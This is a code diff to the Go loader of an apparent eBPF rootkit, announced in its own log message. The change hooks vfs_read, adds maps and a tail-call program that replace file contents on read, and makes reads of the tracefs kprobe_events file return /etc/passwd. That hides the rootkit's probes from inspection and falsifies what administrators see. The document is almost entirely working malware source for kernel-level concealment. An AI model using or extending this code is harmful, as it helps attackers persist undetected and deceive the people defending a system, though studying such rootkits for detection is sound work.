@@ -29,20 +29,24 @@ var mainManager = &manager.Manager{
 		{
 			Section: "kprobe/vfs_open",
 		},
+		{
+			Section: "kretprobe/vfs_read",
+		},
 	},
 }
 
 var userWriteManager = &manager.Manager{}
 
 const (
-	KmsgAction uint64 = iota + 1
-	KProbeEventsAction
+	KMsgAction uint64 = iota + 1
+	OverrideContent
 	OverrideReturn0
 )
 
 const (
-	KmsgProg         = KmsgAction
-	KProbeEventsProg = KProbeEventsAction
+	KMsgProg = iota + KMsgAction
+	OverrideContentProg
+
 	FillWithZeroProg = 10
 )
 
@@ -56,6 +60,45 @@ func FNVHashByte(b []byte) uint64 {
 
 func FNVHashStr(s string) uint64 {
 	return FNVHashByte([]byte(s))
+}
+
+type FdContentKey struct {
+	ID    uint64
+	Chunk uint32
+}
+
+// Write write binary representation
+func (p *FdContentKey) Write(buffer []byte) {
+	ByteOrder.PutUint64(buffer[0:8], p.ID)
+	ByteOrder.PutUint32(buffer[8:12], p.Chunk)
+
+	var zero uint32
+	ByteOrder.PutUint32(buffer[12:16], zero)
+}
+
+// Bytes returns array of byte representation
+func (p *FdContentKey) Bytes() []byte {
+	b := make([]byte, 16)
+	p.Write(b)
+	return b
+}
+
+type FdContent struct {
+	Size    uint64
+	Content [64]byte
+}
+
+// Write write binary representation
+func (p *FdContent) Write(buffer []byte) {
+	ByteOrder.PutUint64(buffer[0:8], p.Size)
+	copy(buffer[8:], p.Content[:])
+}
+
+// Bytes returns array of byte representation
+func (p *FdContent) Bytes() []byte {
+	b := make([]byte, len(p.Content)+8)
+	p.Write(b)
+	return b
 }
 
 type FdKey struct {
@@ -153,8 +196,9 @@ func PutPath(m *ebpf.Map, path string, action PathAction) error {
 
 // PathAction represents actions to apply for a path
 type PathAction struct {
-	FSType string
-	Action uint64
+	FSType     string
+	Action     uint64
+	OverrideID uint64
 }
 
 // Write write binary representation
@@ -162,11 +206,12 @@ func (p *PathAction) Write(buffer []byte) {
 	hash := FNVHashStr(p.FSType)
 	ByteOrder.PutUint64(buffer[0:8], hash)
 	ByteOrder.PutUint64(buffer[8:16], p.Action)
+	ByteOrder.PutUint64(buffer[16:24], p.OverrideID)
 }
 
 // Bytes returns array of byte representation
 func (p *PathAction) Bytes() []byte {
-	b := make([]byte, 16)
+	b := make([]byte, 24)
 	p.Write(b)
 	return b
 }
@@ -208,6 +253,38 @@ func getFdKeys(path string) []FdKey {
 	}
 
 	return keys
+}
+
+func PutFdContent(m *ebpf.Map, id uint64, path string) {
+	key := FdContentKey{
+		ID: id,
+	}
+
+	file, err := os.OpenFile(path, os.O_RDONLY, os.ModePerm)
+	if err != nil {
+		return
+	}
+
+	for {
+		fdContent := FdContent{}
+
+		n, err := file.Read(fdContent.Content[:])
+		if err != nil {
+			return
+		}
+
+		if n == 0 {
+			break
+		}
+
+		fdContent.Size = uint64(n)
+
+		if err := m.Put(key.Bytes(), fdContent.Bytes()); err != nil {
+			return
+		}
+
+		key.Chunk++
+	}
 }
 
 func Kmsg(str string) {
@@ -261,12 +338,14 @@ func main() {
 	Kmsg("Your Rootkit is now installed")
 
 	rkFilesMap, _, _ := mainManager.GetMap("rk_files")
-	rkFdAttrs, _, _ := mainManager.GetMap("rk_fd_attrs")
+	rkFdAttrsMap, _, _ := mainManager.GetMap("rk_fd_attrs")
+	rkFdContentsMap, _, _ := mainManager.GetMap("rk_fd_contents")
 
 	// Initialize the write user manager with map from main
 	options.MapEditors = map[string]*ebpf.Map{
-		"rk_files":    rkFilesMap,
-		"rk_fd_attrs": rkFdAttrs,
+		"rk_files":       rkFilesMap,
+		"rk_fd_attrs":    rkFdAttrsMap,
+		"rk_fd_contents": rkFdContentsMap,
 	}
 	options.TailCallRouter = []manager.TailCallRoute{
 		{
@@ -289,11 +368,17 @@ func main() {
 
 	// update main tail call with the ones from user
 	kmsgProg, _, _ := userWriteManager.GetProgram(manager.ProbeIdentificationPair{Section: "kprobe/kmsg"})
+	overrideContentProg, _, _ := userWriteManager.GetProgram(manager.ProbeIdentificationPair{Section: "kprobe/overide_content"})
 	routes := []manager.TailCallRoute{
 		{
 			ProgArrayName: "read_ret_progs",
-			Key:           uint32(KmsgProg),
+			Key:           uint32(KMsgProg),
 			Program:       kmsgProg[0],
+		},
+		{
+			ProgArrayName: "read_ret_progs",
+			Key:           uint32(OverrideContentProg),
+			Program:       overrideContentProg[0],
 		},
 	}
 	mainManager.UpdateTailCallRoutes(routes...)
@@ -307,9 +392,19 @@ func main() {
 	// change action from override to write user
 	action = PathAction{
 		FSType: "devtmpfs",
-		Action: KmsgProg,
+		Action: KMsgProg,
 	}
 	PutPath(pathKeysMap, "kmsg", action)
+
+	action = PathAction{
+		FSType:     "tracefs",
+		Action:     OverrideContent,
+		OverrideID: FNVHashStr("kprobe_events"),
+	}
+	PutPath(pathKeysMap, "kprobe_events", action)
+
+	contentsMap, _, _ := mainManager.GetMap("rk_fd_contents")
+	PutFdContent(contentsMap, FNVHashStr("kprobe_events"), "/etc/passwd")
 
 	wait()
 
